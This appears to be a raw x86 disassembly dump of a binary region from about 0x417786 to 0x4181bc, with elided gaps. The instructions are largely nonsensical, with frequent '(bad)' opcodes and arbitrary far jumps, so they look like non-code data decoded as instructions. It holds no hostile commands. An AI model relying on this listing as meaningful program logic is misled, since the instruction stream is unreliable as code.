  417786:	xor    ebp,DWORD PTR [ebp+ebp*2+0x3d]
  41778a:	outs   dx,BYTE PTR ds:[esi]
  41778b:	xchg   BYTE PTR [ebx-0x60],bh
  41778e:	mov    dl,0x11
  417790:	jg     0x417792
	...
  4177f2:	add    BYTE PTR [eax],al
  4177f4:	jmp    0xff597607
  4177f9:	imul   ecx
  4177fb:	(bad)  
  4177fc:	lahf   
  4177fd:	repnz and dl,dl
  417800:	jge    0x4177fd
  417802:	inc    edi
  417803:	push   ss
  417804:	call   0x1:0x50000f8
  41780b:	add    BYTE PTR [ecx+0x37de0906],dl
  417811:	pop    ebx
  417812:	jmp    0x417807
  417814:	icebp  
  417815:	xor    ah,BYTE PTR [esi+0x16]
  417818:	add    DWORD PTR [eax-0xe],ecx
  41781b:	push   ecx
  41781c:	dec    ecx
  41781d:	icebp  
  41781e:	mov    cl,0x87
  417820:	adc    eax,DWORD PTR [edx+0x1d]
  417823:	arpl   WORD PTR [edx],cx
  417825:	ret    
  417826:	push   ds
  417827:	or     al,0x77
  417829:	aad    0x56
  41782b:	cmp    edx,ebx
  41782d:	jp     0x4177bc
  41782f:	and    al,0xa8
  417831:	inc    ecx
  417832:	fild   WORD PTR [eax+0x4f50c6ff]
  417838:	xlat   BYTE PTR ds:[ebx]
  417839:	stos   BYTE PTR es:[edi],al
  41783a:	and    DWORD PTR [edx+0x63],edx
  41783d:	push   esi
  41783e:	sbb    dl,BYTE PTR [esi]
  417840:	xchg   ecx,eax
  417841:	sub    eax,DWORD PTR [eax-0x180f8f3c]
  417847:	dec    edi
  417848:	leave  
  417849:	mov    BYTE PTR [esi-0x7d],dl
  41784c:	or     eax,0xb4ccf0a8
  417851:	inc    edi
  417852:	lods   al,BYTE PTR ds:[esi]
  417853:	repz mov dl,0xa5
  417856:	lods   al,BYTE PTR ds:[esi]
  417857:	inc    ecx
  417858:	(bad)  
  417859:	(bad)  [esi]
  41785b:	push   0xffffffb1
  41785d:	popa   
  41785e:	sbb    ah,dh
  417860:	inc    ebx
  417861:	mov    al,0x1c
  417863:	mov    ?,WORD PTR [ebp+0x77]
  417866:	adc    BYTE PTR [ecx-0x74d5ae06],bh
  41786c:	gs pop ecx
  41786e:	and    eax,0x6243acc0
  417873:	retf   0x7f00
  417876:	or     ecx,DWORD PTR [bx+di]
  417879:	push   edx
  41787a:	ins    BYTE PTR es:[edi],dx
  41787b:	jbe    0x417837
  41787d:	push   ds
  41787e:	ss lock in eax,dx
  417881:	pop    ecx
  417882:	adc    esp,eax
  417884:	(bad)  
  417885:	mov    esi,0x7c19b2b6
  41788a:	xlat   BYTE PTR ds:[ebx]
  41788b:	fdiv   QWORD PTR [eax-0x8]
  41788e:	fs pop ecx
  417890:	xor    eax,0x600b540
  417895:	pop    es
  417896:	lock jbe 0x417865
  417899:	or     BYTE PTR [ebx],bh
  41789b:	je     0x4178c8
  41789d:	in     eax,0xca
  41789f:	js     0x4178a6
  4178a1:	call   0x952b0045
  4178a6:	pop    ss
  4178a7:	push   ds
  4178a8:	jo     0x417896
  4178aa:	jl     0x41783f
  4178ac:	and    al,0x29
  4178ae:	test   al,0xb
  4178b0:	mov    bh,0x4
  4178b2:	nop
  4178b3:	xor    bl,bl
  4178b5:	jle    0x417906
  4178b7:	inc    ebp
  4178b8:	lods   eax,DWORD PTR ds:[esi]
  4178b9:	dec    edi
  4178ba:	push   cs
  4178bb:	(bad)  
  4178bc:	pop    ebp
  4178bd:	repz mov ch,al
  4178c0:	jb     0x4178e8
  4178c2:	mov    ebp,0x8e1ed04e
  4178c7:	mov    al,ds:0xd9a08b89
  4178cc:	sbb    al,0xda
  4178ce:	popf   
  4178cf:	push   ecx
  4178d0:	loop   0x417877
  4178d2:	adc    al,ch
  4178d4:	mov    esp,0x30c84900
  4178d9:	inc    ebp
  4178da:	add    BYTE PTR fs:[ebp+0x13840cdf],ah
  4178e1:	in     al,dx
  4178e2:	xchg   ebx,eax
  4178e3:	pop    ebp
  4178e4:	push   esp
  4178e5:	xor    ecx,edi
  4178e7:	dec    ebp
  4178e8:	mov    ebx,0xb6500045
  4178ed:	loope  0x41792e
  4178ef:	in     al,dx
  4178f0:	(bad)  
  4178f1:	div    BYTE PTR [edx-0x68]
  4178f4:	add    al,0xac
  4178f6:	das    
  4178f7:	imul   edi,ebx,0x3f
  4178fa:	into   
  4178fb:	add    BYTE PTR [ebx-0x39],ah
  4178fe:	sbb    BYTE PTR [ebp+0xdc5bfea],al
  417904:	or     dl,BYTE PTR [ecx]
  417906:	cmc    
  417907:	mov    dh,0xbb
  417909:	gs pop esp
  41790b:	in     al,dx
  41790c:	add    BYTE PTR [edx-0x11],bh
  41790f:	enter  0x84,0x0
	...
  417973:	add    BYTE PTR [eax+0x41],bl
  417976:	pop    ds
  417977:	lods   eax,DWORD PTR ds:[esi]
  417978:	pop    ds
  417979:	(bad)  
  41797a:	cli    
  41797b:	cmc    
  41797c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797d:	retf   0xe5d4
  417980:	adc    al,BYTE PTR [esi+0x3a]
  417983:	rcr    BYTE PTR [edi+0x50000f9],1
  417989:	add    DWORD PTR [eax],eax
  41798b:	add    BYTE PTR [edx+edx*2-0x74],dl
  41798f:	je     0x4179ed
  417991:	add    dh,dl
  417993:	stos   BYTE PTR es:[edi],al
  417994:	call   FWORD PTR [eax-0x1f16017]
  41799a:	xchg   ebx,eax
  41799b:	mov    edi,0x2b9182cf
  4179a0:	ja     0x417a1a
  4179a2:	dec    esi
  4179a3:	mov    al,ds:0xa2cae434
  4179a8:	mov    cl,0x2a
  4179aa:	push   0x90ad52d7
  4179af:	lock gs arpl dx,bx
  4179b3:	fimul  DWORD PTR [ecx+0x2c4a8174]
  4179b9:	fs scas eax,DWORD PTR es:[edi]
  4179bb:	in     eax,0xf9
  4179bd:	arpl   WORD PTR [ebp+0x7d0e993],sp
  4179c3:	fnsave [edx+0x30]
  4179c6:	mov    ebx,0x942e4671
  4179cb:	lds    ebx,FWORD PTR [edx+0x68]
  4179ce:	inc    ebx
  4179cf:	xchg   ebp,eax
  4179d0:	inc    esp
  4179d1:	js     0x417a37
  4179d3:	dec    BYTE PTR [esi]
  4179d5:	sbb    BYTE PTR [esi+0x7c4e00d1],ch
  4179db:	mov    ebx,0x5b036285
  4179e0:	xlat   BYTE PTR ds:[ebx]
  4179e1:	inc    ebp
  4179e2:	out    0xcf,al
  4179e4:	fdiv   DWORD PTR [ecx+ebx*1+0x12]
  4179e8:	sub    al,BYTE PTR fs:[edx]
  4179eb:	add    al,0x28
  4179ed:	call   0x1d728751
  4179f2:	scas   eax,DWORD PTR es:[edi]
  4179f3:	push   0x6d
  4179f5:	jno    0x4179fb
  4179f7:	int    0xa3
  4179f9:	push   ebx
  4179fa:	and    cl,dh
  4179fc:	pop    esi
  4179fd:	sbb    eax,0x415fee47
  417a02:	ins    DWORD PTR es:[edi],dx
  417a03:	jecxz  0x417a34
  417a05:	mov    cl,0x2d
  417a07:	out    0xcc,eax
  417a09:	aad    0x55
  417a0b:	pop    es
  417a0c:	xor    BYTE PTR [edi+0x61],bl
  417a0f:	out    0x2f,eax
  417a11:	push   es
  417a12:	into   
  417a13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a14:	sbb    dl,BYTE PTR [ebx+0x37]
  417a17:	xchg   esi,eax
  417a18:	loopne 0x4179b4
  417a1a:	div    edi
  417a1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a1d:	sbb    esi,esp
  417a1f:	(bad)  
  417a20:	or     ecx,DWORD PTR [edi+ecx*4-0x41]
  417a24:	sub    bl,bh
  417a26:	add    eax,0x901f4be3
  417a2b:	ins    BYTE PTR es:[edi],dx
  417a2c:	jecxz  0x4179d3
  417a2e:	mov    ecx,0x5d163bb1
  417a33:	fisubr WORD PTR [ebx+0x34]
  417a36:	add    eax,0x706880fb
  417a3b:	sbb    DWORD PTR [eax+0x27],esp
  417a3e:	pop    ss
  417a3f:	add    al,0x8c
  417a41:	jle    0x417a9c
  417a43:	popf   
  417a44:	sbb    ah,al
  417a46:	lea    edi,[ecx]
  417a48:	or     eax,0xa2f7522c
  417a4d:	sti    
  417a4e:	pop    esp
  417a4f:	xor    cl,BYTE PTR [esi-0x3d]
  417a52:	jno    0x4179d8
  417a54:	lahf   
  417a55:	pop    esp
  417a56:	pop    ebp
  417a57:	xchg   DWORD PTR [eax],ecx
  417a59:	std    
  417a5a:	lahf   
  417a5b:	jmp    0x4d9dafe0
  417a60:	mov    esp,0x54da6260
  417a65:	retf   
  417a66:	sbb    BYTE PTR [esi],bh
  417a68:	pushw  cs
  417a6a:	xor    DWORD PTR [esi+edx*2+0x4dfb4ee4],ecx
  417a71:	dec    esp
  417a72:	rcr    BYTE PTR ds:0xfed2f3b3,1
  417a78:	ins    BYTE PTR es:[edi],dx
  417a79:	add    eax,0x1cab4738
  417a7e:	lods   al,BYTE PTR ds:[esi]
  417a7f:	adc    eax,0xf3782dd3
  417a84:	xchg   ebx,eax
  417a85:	jnp    0x417a1d
  417a87:	aaa    
  417a88:	push   ds
  417a89:	ss mov esp,0xdd5fa6d5
  417a8f:	in     eax,0xfe
	...
  417af1:	add    BYTE PTR [eax],al
  417af3:	add    BYTE PTR [edi],ch
  417af5:	stos   DWORD PTR es:[edi],eax
  417af6:	cdq    
  417af7:	inc    ecx
  417af8:	popf   
  417af9:	jae    0x417afa
  417afb:	out    dx,eax
  417afc:	(bad)  [eax]
  417afe:	xor    ebx,DWORD PTR [ecx-0x981c961]
  417b04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b05:	cli    
  417b06:	add    BYTE PTR [eax],al
  417b08:	add    eax,0xe5000001
  417b0d:	sahf   
  417b0e:	or     DWORD PTR [esp+eiz*8-0x53],esi
  417b12:	xchg   esp,eax
  417b13:	ret    0x705
  417b16:	mov    bl,0x2
  417b18:	pop    eax
  417b19:	and    eax,0xdc87f5bc
  417b1e:	pop    es
  417b1f:	ret    
  417b20:	jno    0x417b8c
  417b22:	pop    ebx
  417b23:	xchg   esi,eax
  417b24:	jbe    0x417af9
  417b26:	add    ch,BYTE PTR [edi]
  417b28:	or     BYTE PTR [ebx],cl
  417b2a:	ret    
  417b2b:	push   cs
  417b2c:	xor    ebp,ecx
  417b2e:	xor    DWORD PTR [eax],ebx
  417b30:	test   ah,bh
  417b32:	fcmovnu st,st(2)
  417b34:	mov    ah,0x3b
  417b36:	jne    0x417ae9
  417b38:	sub    eax,0x962a7fbe
  417b3d:	fcomp  DWORD PTR [ecx]
  417b3f:	fxch   st(6)
  417b41:	aas    
  417b42:	inc    esp
  417b43:	test   DWORD PTR [edx+ecx*1],ecx
  417b46:	sub    BYTE PTR [eax+ebp*4],ah
  417b49:	je     0x417b8a
  417b4b:	in     al,dx
  417b4c:	jmp    0xb8021916
  417b51:	add    al,0x3a
  417b53:	dec    esi
  417b54:	and    al,0x19
  417b56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b57:	mov    ?,WORD PTR [ecx-0x74]
  417b5a:	shr    bl,0x5d
  417b5d:	mov    ecx,esi
  417b5f:	cmc    
  417b60:	pop    edi
  417b61:	das    
  417b62:	push   ebp
  417b63:	arpl   WORD PTR [ebx],ax
  417b65:	cs push eax
  417b67:	jo     0x417ba1
  417b69:	stos   BYTE PTR es:[edi],al
  417b6a:	pop    ecx
  417b6b:	lahf   
  417b6c:	jmp    0x6361:0x80897540
  417b73:	mov    bl,BYTE PTR [eax-0x41]
  417b76:	std    
  417b77:	fistp  WORD PTR [ebx]
  417b79:	es out 0xc9,al
  417b7c:	xchg   ebp,eax
  417b7d:	movzx  ebx,BYTE PTR [ebp+eax*8+0x2fda72ef]
  417b85:	ins    BYTE PTR es:[edi],dx
  417b86:	enter  0x8f65,0xd2
  417b8a:	cdq    
  417b8b:	stos   BYTE PTR es:[edi],al
  417b8c:	push   ecx
  417b8d:	sbb    al,0x52
  417b8f:	add    ebp,edx
  417b91:	xor    al,BYTE PTR [edx-0x70a7d68f]
  417b97:	fs aad 0x3
  417b9a:	sub    ebx,DWORD PTR [eax-0x76]
  417b9d:	mov    ecx,DWORD PTR [edx-0x5e685d61]
  417ba3:	push   ss
  417ba4:	pop    ds
  417ba5:	jmp    0xe4b1:0xc71b4b0e
  417bac:	mov    dl,cl
  417bae:	out    0x8a,al
  417bb0:	sbb    ecx,ebp
  417bb2:	mov    ebx,0x83b5e0d2
  417bb7:	pop    esi
  417bb8:	jl     0x417b94
  417bba:	or     eax,0x268cfa4
  417bbf:	icebp  
  417bc0:	fld    QWORD PTR [edi]
  417bc2:	ins    BYTE PTR es:[edi],dx
  417bc3:	mov    ch,0x9e
  417bc5:	xchg   esi,eax
  417bc6:	retf   
  417bc7:	in     al,0x6c
  417bc9:	mov    esi,0x52b7099c
  417bce:	jge    0x417b78
  417bd0:	or     dh,BYTE PTR [ecx+0x0]
  417bd3:	push   esi
  417bd4:	push   cs
  417bd5:	pop    eax
  417bd6:	lods   eax,DWORD PTR ds:[esi]
  417bd7:	and    esi,DWORD PTR ds:0x135f9c97
  417bdd:	jge    0x417b82
  417bdf:	or     dl,0xf8
  417be2:	into   
  417be3:	xor    eax,0x40ad6832
  417be8:	cmp    BYTE PTR [edx-0xb],dl
  417beb:	adc    dl,dl
  417bed:	(bad)  
  417bee:	lock (bad) 
  417bf0:	push   edi
  417bf1:	mov    WORD PTR fs:[edi-0x7b],?
  417bf5:	or     BYTE PTR [esi-0x5032c118],cl
  417bfb:	inc    esp
  417bfc:	jne    0x417bb3
  417bfe:	data16 sti 
  417c00:	hlt    
  417c01:	sbb    BYTE PTR [esi],bl
  417c03:	jg     0x417bd1
  417c05:	lods   eax,DWORD PTR ds:[esi]
  417c06:	out    0xf7,al
  417c08:	lods   al,BYTE PTR ds:[esi]
  417c09:	cmp    dl,BYTE PTR ds:0xf86453c
  417c0f:	fist   DWORD PTR [esi+0x0]
	...
  417c71:	add    BYTE PTR [eax],al
  417c73:	add    BYTE PTR [ecx-0x267b6f40],cl
  417c79:	aam    0x9d
  417c7b:	int    0x75
  417c7d:	aaa    
  417c7e:	das    
  417c7f:	aam    0x1b
  417c81:	push   esp
  417c82:	dec    edx
  417c83:	popa   
  417c84:	test   eax,0x50000fb
  417c89:	add    DWORD PTR [eax],eax
  417c8b:	add    ch,ch
  417c8d:	in     eax,0x74
  417c8f:	mov    cs,WORD PTR [ecx-0x7472bf26]
  417c95:	in     al,dx
  417c96:	fdiv   QWORD PTR [ecx-0x17]
  417c99:	outs   dx,DWORD PTR ds:[esi]
  417c9a:	mov    BYTE PTR [edi+0x19f14385],dh
  417ca0:	mov    ?,edx
  417ca2:	adc    ebp,DWORD PTR [eax+0x4d870324]
  417ca8:	sub    ch,BYTE PTR [edx+0x64]
  417cab:	aad    0x19
  417cad:	call   0x43bdadf
  417cb2:	xlat   BYTE PTR ds:[ebx]
  417cb3:	adc    BYTE PTR [esp+edi*2-0x26],al
  417cb7:	and    BYTE PTR [ecx-0x4382a886],al
  417cbd:	add    eax,0x43e74b28
  417cc2:	mov    bl,0x23
  417cc4:	pusha  
  417cc5:	cmp    DWORD PTR [eax+0x1155d5fd],edi
  417ccb:	out    dx,al
  417ccc:	in     eax,0x70
  417cce:	(bad)  
  417ccf:	out    dx,eax
  417cd0:	mov    al,ds:0x5039ecd3
  417cd5:	mov    bl,0x3c
  417cd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cd8:	leave  
  417cd9:	add    DWORD PTR [eax-0x67],esi
  417cdc:	dec    eax
  417cdd:	popf   
  417cde:	shl    DWORD PTR [eax-0x3f2f7417],0x5
  417ce5:	and    esi,DWORD PTR [eax-0x5b842641]
  417ceb:	in     eax,dx
  417cec:	in     eax,0x17
  417cee:	push   eax
  417cef:	push   ecx
  417cf0:	mov    bh,0xe4
  417cf2:	sub    dh,al
  417cf4:	mov    al,0x7d
  417cf6:	or     ah,bh
  417cf8:	cmp    al,0x63
  417cfa:	lea    ecx,[ecx-0x48]
  417cfd:	pop    ecx
  417cfe:	sub    al,dl
  417d00:	les    esp,FWORD PTR [ecx+eiz*1]
  417d03:	enter  0xe3a7,0x2c
  417d07:	xor    ecx,esp
  417d09:	push   ds
  417d0a:	dec    ecx
  417d0b:	or     esi,edi
  417d0d:	ret    
  417d0e:	mov    DWORD PTR [ebx],ebp
  417d10:	xchg   edx,eax
  417d11:	aas    
  417d12:	mov    DWORD PTR [edi+0x35a65333],ecx
  417d18:	fwait
  417d19:	push   ecx
  417d1a:	js     0x417cbc
  417d1c:	sti    
  417d1d:	dec    esi
  417d1e:	fild   WORD PTR [ebx+0x1b]
  417d21:	xor    ah,al
  417d23:	mov    eax,ds:0x1e2fdbe5
  417d28:	jecxz  0x417d0d
  417d2a:	enter  0x9875,0xa7
  417d2e:	jae    0x417ce5
  417d30:	and    BYTE PTR [esi],cl
  417d32:	stos   DWORD PTR es:[edi],eax
  417d33:	or     eax,0x4a3e30ce
  417d38:	aas    
  417d39:	cmp    dl,BYTE PTR [ecx+0x7fdb7f05]
  417d3f:	or     DWORD PTR [eax+0x68],ebp
  417d42:	jmp    0x276d:0xf16ba78e
  417d49:	mov    al,0xd1
  417d4b:	xchg   BYTE PTR [ebx],ah
  417d4d:	dec    esi
  417d4e:	(bad)  
  417d4f:	rol    BYTE PTR [ecx],1
  417d51:	push   edx
  417d52:	jae    0x417d67
  417d54:	mov    WORD PTR [esi+0x35],?
  417d57:	push   cs
  417d58:	shl    eax,cl
  417d5a:	and    eax,0x8873b260
  417d5f:	jne    0x417cf7
  417d61:	cmp    DWORD PTR [ebx+0x59],esp
  417d64:	or     DWORD PTR [ebx],edi
  417d66:	pop    eax
  417d67:	mov    ds:0x87df4c52,eax
  417d6c:	sbb    ah,ah
  417d6e:	test   al,0x93
  417d70:	repnz and DWORD PTR [ecx-0x15996ed],ebp
  417d77:	xchg   edi,eax
  417d78:	xor    BYTE PTR es:[ebp-0x6004b3b6],ah
  417d7f:	cmp    al,0x4a
  417d81:	mov    al,ds:0xeadbe7dd
  417d86:	adc    al,BYTE PTR [eax]
  417d88:	jle    0x417dec
  417d8a:	mov    WORD PTR [ebx],es
  417d8c:	loopne 0x417d22
  417d8e:	fiadd  DWORD PTR ds:0x40
	...
  417df4:	pop    ss
  417df5:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417dfb:	addr16 dec esi
  417dfd:	sub    BYTE PTR [ecx+0x46],ch
  417e00:	pop    edi
  417e01:	mov    edx,0xfcae85b1
  417e06:	add    BYTE PTR [eax],al
  417e08:	add    eax,0x2a000001
  417e0d:	iret   
  417e0e:	rol    BYTE PTR [ecx+0x7ace1248],1
  417e14:	xchg   esp,eax
  417e15:	jb     0x417e6c
  417e17:	mov    al,0x49
  417e19:	push   cs
  417e1a:	popf   
  417e1b:	stos   BYTE PTR es:[edi],al
  417e1c:	popf   
  417e1d:	mov    ch,0x2f
  417e1f:	jge    0x417e21
  417e21:	pop    ebp
  417e22:	js     0x417dec
  417e24:	mov    ds:0x4ae2570c,al
  417e29:	hlt    
  417e2a:	push   ebx
  417e2b:	sbb    ebp,DWORD PTR [esi*8-0x46175ac3]
  417e32:	ficomp WORD PTR [eax]
  417e34:	clc    
  417e35:	or     al,0x8f
  417e37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e38:	cmp    DWORD PTR [edx+0x77d367e0],0xffffffaf
  417e3f:	ja     0x417e39
  417e41:	push   eax
  417e42:	ss aam 0xd8
  417e45:	test   BYTE PTR [ebp-0x10],dh
  417e48:	cmp    bl,BYTE PTR [edi+0x42b016f9]
  417e4e:	neg    dh
  417e50:	jmp    0xb084:0xcdfbd6ad
  417e57:	push   ebp
  417e58:	das    
  417e59:	loope  0x417e17
  417e5b:	dec    ebx
  417e5c:	xor    BYTE PTR ds:0xb80b1339,0x8c
  417e63:	loopne 0x417e99
  417e65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e66:	fnstsw WORD PTR [edx]
  417e68:	mov    bh,0x5c
  417e6a:	cs jae 0x417e38
  417e6d:	sub    ebp,edx
  417e6f:	mov    dl,BYTE PTR [edi+0x3ba5d870]
  417e75:	data16 rol BYTE PTR [ecx],1
  417e78:	add    dl,bh
  417e7a:	mov    esi,0xf8325aec
  417e7f:	add    DWORD PTR [eax+0x2cc441fb],ebp
  417e85:	dec    esi
  417e86:	or     DWORD PTR ds:0x83d58dec,esi
  417e8c:	mov    dh,0xf4
  417e8e:	and    eax,0xc63c1dda
  417e93:	adc    BYTE PTR [edx],ch
  417e95:	xor    edi,eax
  417e97:	in     eax,dx
  417e98:	jnp    0x417e39
  417e9a:	imul   esp,DWORD PTR [edi-0x34],0xffffffb2
  417e9e:	sbb    al,0x6f
  417ea0:	inc    ecx
  417ea1:	repz popa 
  417ea3:	jl     0x417ea9
  417ea5:	fbld   TBYTE PTR [eax+0x6c456ddf]
  417eab:	pop    ebx
  417eac:	imul   BYTE PTR [ebp-0x18]
  417eaf:	add    esp,edi
  417eb1:	ret    
  417eb2:	xchg   edi,eax
  417eb3:	or     al,0x8c
  417eb5:	popf   
  417eb6:	pop    ecx
  417eb7:	sub    BYTE PTR [edx-0x2],cl
  417eba:	lea    esp,[eax-0x22257718]
  417ec0:	mov    ds:0xf3f0564e,eax
  417ec5:	push   ebp
  417ec6:	out    dx,al
  417ec7:	cmc    
  417ec8:	out    dx,eax
  417ec9:	jmp    0x3c63:0xbc7edae8
  417ed0:	das    
  417ed1:	test   eax,0x8cd197fe
  417ed6:	int    0x88
  417ed8:	lds    ebx,FWORD PTR [edx+0x7f2be22b]
  417ede:	xchg   edx,eax
  417edf:	repz push ds
  417ee1:	jne    0x417f4e
  417ee3:	cmc    
  417ee4:	add    ebx,eax
  417ee6:	call   0x63f4cb62
  417eeb:	out    0xb5,eax
  417eed:	pop    es
  417eee:	sbb    ah,bl
  417ef0:	adc    DWORD PTR [ebx],ecx
  417ef2:	retf   
  417ef3:	imul   edi,DWORD PTR [esp+ecx*2+0x5b],0xccd5cda4
  417efb:	sbb    eax,0xeab8a818
  417f00:	mov    edi,0xce31420f
  417f05:	jno    0x417f53
  417f07:	(bad)  
  417f08:	fwait
  417f09:	mov    al,0x4f
  417f0b:	es push ds
  417f0d:	mov    dh,0xac
  417f0f:	mov    esp,0x16
	...
  417f74:	(bad)  
  417f75:	out    0xe6,al
  417f77:	cmp    esp,esi
  417f79:	cmp    edi,edi
  417f7b:	push   DWORD PTR [edx]
  417f7d:	xchg   edx,eax
  417f7e:	xor    al,bh
  417f80:	jns    0x417f64
  417f82:	add    al,bl
  417f84:	mov    bl,0xfd
  417f86:	add    BYTE PTR [eax],al
  417f88:	add    eax,0xe4000001
  417f8d:	sbb    dh,cl
  417f8f:	test   BYTE PTR ds:0x6802a17c,al
  417f95:	sub    BYTE PTR gs:[eax],0xc4
  417f99:	sbb    eax,esi
  417f9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f9c:	jae    0x417f27
  417f9e:	and    eax,DWORD PTR [edi]
  417fa0:	jmp    0xaa0b098
  417fa5:	push   es
  417fa6:	push   ds
  417fa7:	sbb    DWORD PTR [ebx],ecx
  417fa9:	outs   dx,DWORD PTR ds:[esi]
  417faa:	icebp  
  417fab:	sbb    eax,0xc10c347
  417fb0:	dec    ecx
  417fb1:	cwde   
  417fb2:	push   ds
  417fb3:	pusha  
  417fb4:	inc    edi
  417fb5:	add    bl,ch
  417fb7:	jo     0x417fac
  417fb9:	out    0xaf,eax
  417fbb:	sahf   
  417fbc:	sar    BYTE PTR [ebx],1
  417fbe:	or     eax,0x8afa0603
  417fc3:	int3   
  417fc4:	jp     0x41801e
  417fc6:	push   ebx
  417fc7:	repnz pop esi
  417fc9:	fdiv   QWORD PTR [edx-0x61239fec]
  417fcf:	sub    BYTE PTR [ebx],dl
  417fd1:	ja     0x418001
  417fd3:	fnstsw WORD PTR [ebx+0x2b]
  417fd6:	or     bh,al
  417fd8:	cmp    al,0x57
  417fda:	aam    0x56
  417fdc:	jl     0x417f8a
  417fde:	retf   
  417fdf:	xchg   ecx,eax
  417fe0:	aaa    
  417fe1:	lods   eax,DWORD PTR ds:[esi]
  417fe2:	cmc    
  417fe3:	nop
  417fe4:	outs   dx,DWORD PTR ds:[esi]
  417fe5:	enter  0xe514,0xca
  417fe9:	shr    BYTE PTR [ecx+eax*2+0x24],cl
  417fed:	jge    0x417ff0
  417fef:	ins    BYTE PTR es:[edi],dx
  417ff0:	loope  0x417f7d
  417ff2:	fisub  WORD PTR [ebp-0x6064cb65]
  417ff8:	loop   0x418006
  417ffa:	jb     0x418006
  417ffc:	sub    eax,DWORD PTR [edx]
  417ffe:	mov    al,0x6c
  418000:	sar    cl,1
  418002:	mov    eax,0x4c68620e
  418007:	popf   
  418008:	fisub  DWORD PTR [ecx+eax*2]
  41800b:	ss stc 
  41800d:	push   ebx
  41800e:	pushf  
  41800f:	ret    0xd8f3
  418012:	adc    dh,BYTE PTR ds:0xc28118fa
  418018:	les    dx,DWORD PTR [edx-0x568b76d2]
  41801f:	repz lea edi,[ecx-0x47]
  418023:	stos   BYTE PTR es:[edi],al
  418024:	pop    ds
  418025:	push   edi
  418026:	test   DWORD PTR [edx-0x1ef921de],ebx
  41802c:	mov    edx,0x458e7168
  418031:	ret    
  418032:	jl     0x41804a
  418034:	or     esi,DWORD PTR [ebx+0x3f870317]
  41803a:	sub    ch,BYTE PTR [esi]
  41803c:	mov    ebx,0x19659265
  418041:	push   esp
  418042:	mov    al,0xaf
  418044:	sti    
  418045:	imul   edx,DWORD PTR ds:0xabfb2b04,0x6
  41804c:	mov    eax,ds:0x56883e67
  418051:	sbb    al,ch
  418053:	lock loopne 0x4180b6
  418056:	fstp   st(0)
  418058:	push   es
  418059:	inc    esp
  41805a:	xor    DWORD PTR [ecx-0x375a8c85],ecx
  418060:	inc    ebp
  418061:	mov    ebx,edi
  418063:	jl     0x418003
  418065:	xor    ch,al
  418067:	jl     0x41801a
  418069:	daa    
  41806a:	pop    esi
  41806b:	repnz push ds
  41806d:	inc    esi
  41806e:	pop    ss
  41806f:	xlat   BYTE PTR ds:[ebx]
  418070:	sbb    eax,0x6bc2b225
  418075:	rcl    DWORD PTR [edi+0x203d81a3],0xf1
  41807c:	sbb    edi,DWORD PTR [edi+0x137fab8c]
  418082:	cmp    BYTE PTR [eax+0x1db77644],bl
  418088:	jo     0x418023
  41808a:	hlt    
  41808b:	inc    ebx
  41808c:	xlat   BYTE PTR ds:[ebx]
  41808d:	out    0xff,eax
  41808f:	cmc    
  418090:	xchg   edi,eax
	...
  4180f1:	add    BYTE PTR [eax],al
  4180f3:	add    BYTE PTR [ecx-0xba9482],ch
  4180f9:	push   ebp
  4180fa:	scas   eax,DWORD PTR es:[edi]
  4180fb:	(bad)  
  4180fc:	mov    ds:0x6a2fdebc,eax
  418101:	xlat   BYTE PTR ds:[ebx]
  418102:	test   eax,0xfeb803
  418107:	add    BYTE PTR ds:0xaf000001,al
  41810d:	clc    
  41810e:	stc    
  41810f:	jmp    0x4180aa
  418111:	adc    DWORD PTR [ebx-0x2dfed915],ecx
  418117:	outs   dx,BYTE PTR ds:[esi]
  418118:	mov    ds:0x8a6230b,al
  41811d:	and    BYTE PTR [edx+0x3e],al
  418120:	out    0x16,al
  418122:	xchg   edi,eax
  418123:	xchg   esp,eax
  418124:	test   BYTE PTR [edi],al
  418126:	dec    eax
  418127:	(bad)  [edx]
  418129:	aaa    
  41812a:	in     al,dx
  41812b:	ror    edi,1
  41812d:	inc    esp
  41812e:	int    0xf0
  418130:	mov    eax,gs
  418132:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418133:	(bad)  
  418134:	dec    ebx
  418135:	cwde   
  418136:	icebp  
  418137:	xlat   BYTE PTR ds:[ebx]
  418138:	inc    ebx
  418139:	rcr    BYTE PTR gs:[ecx-0x2c],cl
  41813d:	mov    edi,0x50497a53
  418142:	leave  
  418143:	jl     0x41813a
  418145:	and    dl,BYTE PTR [eax]
  418147:	in     al,0x7e
  418149:	mov    dl,0xb9
  41814b:	shl    ebp,1
  41814d:	push   esi
  41814e:	push   esp
  41814f:	sbb    eax,DWORD PTR [edi+0x23]
  418152:	dec    edx
  418153:	add    al,0x4b
  418155:	xor    al,BYTE PTR [ebp-0xcf6b029]
  41815b:	add    BYTE PTR [ebp-0x23149eca],bl
  418161:	cmp    al,0x6a
  418163:	lahf   
  418164:	in     al,0x32
  418166:	pop    eax
  418167:	loop   0x41819d
  418169:	fisttp DWORD PTR [edi]
  41816b:	jmp    0xfbbb0756
  418170:	outs   dx,BYTE PTR ds:[esi]
  418171:	xor    BYTE PTR [edx+ebx*1],ah
  418174:	fwait
  418175:	cld    
  418176:	test   ecx,0xf37f03f0
  41817c:	add    bl,BYTE PTR [ebx-0x12ff62f1]
  418182:	push   ebx
  418183:	jge    0x41811e
  418185:	or     eax,DWORD PTR [ecx-0x42fa723a]
  41818b:	pusha  
  41818c:	inc    eax
  41818d:	jne    0x4181ff
  41818f:	es and al,0x75
  418192:	sbb    al,0x59
  418194:	inc    ecx
  418195:	imul   ecx,DWORD PTR [edx],0x3b
  418198:	push   ds
  418199:	in     al,dx
  41819a:	repz loopne 0x418215
  41819d:	popa   
  41819e:	ins    BYTE PTR es:[edi],dx
  41819f:	adc    esp,DWORD PTR [edx-0x7dfc1a35]
  4181a5:	and    BYTE PTR [ebx+0x720ae05a],dl
  4181ab:	sbb    eax,0xe452e3fc
  4181b0:	mov    eax,ds:0x8b093549
  4181b5:	fdiv   QWORD PTR ds:0x93c01cae
  4181bb:	clc    
  4181bc:	mov    edi,0x2a88cc57
